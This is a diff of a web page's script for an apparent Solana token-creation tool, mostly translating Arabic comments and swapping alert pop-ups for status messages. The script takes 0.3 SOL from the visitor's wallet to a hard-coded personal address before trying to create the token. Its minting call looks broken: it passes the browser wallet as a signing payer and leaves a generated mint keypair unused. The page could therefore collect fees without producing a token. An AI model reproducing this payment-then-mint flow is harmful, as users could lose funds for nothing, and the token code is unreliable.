@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -227,42 +226,41 @@
                 return;
             }
 
+            document.getElementById("status").innerText = "Creating token... Please wait.";
+
             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
             const publicKey = window.solana.publicKey;
             const balance = await connection.getBalance(publicKey);
 
-            const fee = 0.3 * 1e9; // 0.3 SOL بالـ lamports (1 SOL = 1e9 lamports)
+            const fee = 0.3 * 1e9; // 0.3 SOL in lamports (1 SOL = 1e9 lamports)
+            
             if (balance < fee) {
-                alert("Insufficient funds! Please ensure you have at least 0.3 SOL to create the token.");
+                document.getElementById("status").innerText = "❌ Insufficient funds! Please ensure you have at least 0.3 SOL to create the token.";
                 return;
             }
 
-            // تحديد عنوان محفظتك الشخصية
-            const personalWalletAddress = 'HGF6MqYTrAViZTeRKStyLG81apiGaGz2GXg7Cw1n6n3V'; // عنوان محفظتك الشخصية
+            const personalWalletAddress = 'HGF6MqYTrAViZTeRKStyLG81apiGaGz2GXg7Cw1n6n3V';
 
-            // إنشاء معاملة خصم الرسوم
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: publicKey,
-                    toPubkey: personalWalletAddress,  // إيداع الرسوم في محفظتك الشخصية
-                    lamports: fee, // 0.3 SOL بالـ lamports
+                    toPubkey: personalWalletAddress,
+                    lamports: fee,
                 })
             );
 
             try {
-                // إرسال المعاملة لتأكيد الخصم
                 const signature = await window.solana.signAndSendTransaction(transaction);
                 await connection.confirmTransaction(signature);
 
-                // إذا تم تنفيذ المعاملة بنجاح، يمكن الآن إنشاء التوكن
                 const mint = await solanaWeb3.Keypair.generate();
                 const token = await splToken.createMint(
-                    connection, window.solana, publicKey, null, 6 // الدقائق
+                    connection, window.solana, publicKey, null, 6 // decimals
                 );
 
-                alert(`Token ${document.getElementById("tokenName").value} created successfully!`);
+                document.getElementById("status").innerText = `✅ Token ${document.getElementById("tokenName").value} created successfully!`;
             } catch (error) {
-                alert("Transaction failed or was cancelled.");
+                document.getElementById("status").innerText = "❌ Transaction failed or was cancelled.";
             }
         }
     </script>
